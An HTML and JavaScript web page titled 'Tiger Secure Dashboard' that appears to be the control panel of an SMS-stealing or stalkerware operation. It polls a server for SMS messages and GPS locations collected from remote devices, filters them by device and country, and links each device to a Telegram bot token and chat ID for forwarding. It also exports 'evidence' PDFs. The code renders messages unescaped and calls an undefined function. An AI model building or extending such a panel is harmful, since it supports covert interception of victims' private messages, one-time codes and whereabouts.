<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tiger Secure Dashboard</title>
    <!-- JetBrains Mono font for terminal feel -->
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'JetBrains Mono', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #05070a; color: #fff; margin: 0; padding: 20px; }
        .container { max-width: 1200px; margin: auto; }
        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #ff6b00; padding-bottom: 10px; margin-bottom: 20px; }
        .status-badge { background: #00ff41; padding: 5px 10px; border-radius: 5px; font-size: 0.8em; color: #000; }
        table { width: 100%; border-collapse: collapse; background: rgba(255,255,255,0.02); border-radius: 8px; overflow: hidden; }
        th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.04); }
        th { background-color: transparent; color: #00ff41; text-transform: uppercase; font-size: 0.8em; }
        tr:hover { background-color: rgba(0,255,65,0.03); }
        .btn-clear { background: #ff6b00; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; transition: 0.3s; }
        .btn-clear:hover { box-shadow: 0 0 20px rgba(255,107,0,0.4); }
        .no-data { text-align: center; padding: 40px; color: #888; }
        .map-link { color: #00d4ff; text-decoration: none; font-weight: bold; border: 1px solid #00d4ff; padding: 3px 8px; border-radius: 4px; font-size: 0.8em; }
        .map-link:hover { background: #00d4ff; color: #000; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🐅 TIGER <span style="color: #ff4500;">LIVE LOGS</span></h1>
            <div>
                <span class="status-badge" id="sync-status">Connected</span>
                <button class="btn-clear" onclick="clearLogs()">Clear All Logs</button>
            </div>
        </div>

        <div class="main" style="display:flex; gap:20px; align-items:flex-start;">
            <aside class="sidebar" style="width: 300px; padding: 15px; background: rgba(255,255,255,0.02); border-radius: 8px;">
                <h3 style="margin-top:0; color:#00ff41;">Devices & Users</h3>
                <div style="margin-bottom:8px; display:flex; gap:8px;">
                    <button class="btn-clear" onclick="fetchUsers()">Refresh</button>
                    <button class="btn-clear" onclick="selectDevice(null)" style="background:#0066ff">All Devices</button>
                </div>

                <div id="users-list" style="max-height:160px; overflow:auto; margin-bottom:12px;">
                    <!-- Populated dynamically -->
                </div>

                <h4 style="color:#8be9fd; margin-top:6px;">Countries</h4>
                <div style="display:flex; gap:8px; margin-bottom:8px;">
                  <button class="btn-clear" onclick="fetchCountries()" style="background:#00bcd4">Refresh</button>
                  <button class="btn-clear" onclick="selectCountry(null)" style="background:#444">All</button>
                </div>
                <div id="countries-list" style="max-height:120px; overflow:auto; color:#ddd; font-size:0.95em;">
                  <div style="color:#888; padding:8px">No countries yet</div>
                </div>

                <hr style="border-color: rgba(255,255,255,0.04);">
                <h4 style="color:#ffd079;">Add / Update User</h4>
                <div style="display:flex; flex-direction:column; gap:8px;">
                    <input id="u-deviceId" placeholder="Device ID" style="padding:8px; border-radius:4px; border:1px solid rgba(255,255,255,0.04); background:transparent; color:#fff;" />
                    <input id="u-bot" placeholder="Telegram Bot Token" style="padding:8px; border-radius:4px; border:1px solid rgba(255,255,255,0.04); background:transparent; color:#fff;" />
                    <input id="u-chat" placeholder="Telegram Chat ID" style="padding:8px; border-radius:4px; border:1px solid rgba(255,255,255,0.04); background:transparent; color:#fff;" />
                    <div style="display:flex; gap:8px;">
                        <button class="btn-clear" onclick="saveUser()">Save</button>
                    </div>
                </div>

                <hr style="border-color: rgba(255,255,255,0.04);">
                <div style="display:flex; gap:8px;">
                    <button class="btn-clear" onclick="downloadEvidence()">Download Evidence</button>
                    <button class="btn-clear" onclick="sendTest()" style="background:#ff0066">Send Test</button>
                </div>
            </aside>

            <section class="main-table" style="flex:1;">
                <table>
                    <thead>
                        <tr>
                            <th>Device</th>
                            <th>Sender</th>
                            <th>Message</th>
                            <th>Time</th>
                            <th>Location</th>
                        </tr>
                    </thead>
                    <tbody id="log-table-body"></tbody>
                </table>
                <div id="no-data-msg" class="no-data" style="display: none;">No SMS logs found for this device...</div>
            </section>
        </div>
    </div>

    <script>
        let selectedDeviceId = null;
        let selectedCountry = null;
        let usersCache = [];

        async function fetchCountries() {
            try {
                const res = await fetch('/stats/countries');
                const arr = await res.json();
                const cContainer = document.getElementById('countries-list');
                if (!arr || arr.length === 0) {
                    cContainer.innerHTML = '<div style="color:#888; padding:8px">No countries yet</div>';
                    return;
                }
                cContainer.innerHTML = arr.map(c => `<div style="padding:6px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid rgba(255,255,255,0.02);">
                  <div style="min-width:0; overflow:hidden;"><strong style="color:#8be9fd">${c.country}</strong><div style="font-size:0.85em; color:#aaa">${c.code}</div></div>
                  <div style="display:flex; gap:8px; align-items:center"><div style="color:#fff; background:#222; padding:4px 8px; border-radius:4px">${c.count}</div>
                    <button class="btn-clear" onclick="selectCountry('${c.code}')" style="padding:6px 8px;">View</button>
                  </div>
                </div>`).join('');
            } catch (err) {
                console.error('Countries fetch error', err);
            }
        }

        function prefillUser(deviceId, bot, chat) {
            document.getElementById('u-deviceId').value = deviceId || '';
            document.getElementById('u-bot').value = bot || '';
            document.getElementById('u-chat').value = chat || '';
        }

        async function saveUser() {
            const deviceId = document.getElementById('u-deviceId').value.trim();
            const bot = document.getElementById('u-bot').value.trim();
            const chat = document.getElementById('u-chat').value.trim();
            if (!deviceId) return alert('deviceId is required');
            try {
                const res = await fetch('/users', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId, telegramBotToken: bot || null, telegramChatId: chat || null }) });
                const json = await res.json();
                alert('Saved user: ' + json.deviceId);
                fetchUsers();
            } catch (err) { console.error('Save user error', err); alert('Failed to save user') }
        }

        function selectDevice(deviceId) {
            selectedDeviceId = deviceId;
            selectedCountry = null;
            fetchLogs();
        }

        function selectCountry(code) {
            selectedCountry = code;
            selectedDeviceId = null;
            fetchLogs();
        }

        async function fetchLogs() {
            try {
                let query = '';
                if (selectedDeviceId) query = `?deviceId=${encodeURIComponent(selectedDeviceId)}`;
                else if (selectedCountry) query = `?country=${encodeURIComponent(selectedCountry)}`;
                const response = await fetch('/get-logs' + query);
                const logs = await response.json();
                const tableBody = document.getElementById('log-table-body');
                const noDataMsg = document.getElementById('no-data-msg');

                if (!logs || logs.length === 0) {
                    tableBody.innerHTML = '';
                    noDataMsg.style.display = 'block';
                    return;
                }

                noDataMsg.style.display = 'none';
                tableBody.innerHTML = logs.map(log => {
                    const locationHtml = (log.location && log.location !== "Disabled") 
                        ? `<a href="https://www.google.com/maps?q=${log.location}" target="_blank" class="map-link">📍 View Map</a>`
                        : `<span style="color: #666;">No Data</span>`;

                    return `
                        <tr>
                            <td style="color: #ff4500; font-weight: bold;">${log.device}</td>
                            <td>${log.sender}</td>
                            <td>${log.message}</td>
                            <td style="font-size: 0.85em; color: #aaa;">${log.time}</td>
                            <td>${locationHtml}</td>
                        </tr>
                    `;
                }).join('');

                document.getElementById('sync-status').innerText = selectedDeviceId ? `Device: ${selectedDeviceId} — Last Sync: ` + new Date().toLocaleTimeString() : 'Last Sync: ' + new Date().toLocaleTimeString();
                document.getElementById('sync-status').style.background = '#28a745';
            } catch (error) {
                console.error('Fetch Error:', error);
                document.getElementById('sync-status').innerText = 'Sync Error!';
                document.getElementById('sync-status').style.background = '#dc3545';
            }
        }

        async function downloadEvidence() {
            if (!selectedDeviceId) return alert('Select a device first');
            try {
                const res = await fetch('/evidence', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId: selectedDeviceId, limit: 500 }) });
                if (!res.ok) return alert('Failed to generate evidence');
                const blob = await res.blob();
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `tiger_evidence_${selectedDeviceId}.pdf`;
                document.body.appendChild(a);
                a.click();
                a.remove();
                window.URL.revokeObjectURL(url);
            } catch (err) { console.error('Evidence download error', err); alert('Failed to download evidence') }
        }

        async function sendTest() {
            if (!selectedDeviceId) return alert('Select a device first');
            try {
                const res = await fetch(`/send-test/${encodeURIComponent(selectedDeviceId)}`, { method: 'POST' });
                if (res.ok) alert('Test notification sent'); else alert('Failed to send test');
            } catch (err) { console.error('Send test error', err); alert('Failed to send test') }
        }

        async function clearLogs() {
            if (confirm('Kya aap saare logs delete karna chahte hain?')) {
                await fetch('/clear-logs', { method: 'POST' });
                fetchLogs();
            }
        }

        // Initial load
        fetchUsers();
        setInterval(() => { fetchUsers(); fetchLogs(); }, 5000);
        fetchLogs();
    </script>
</body>
</html>
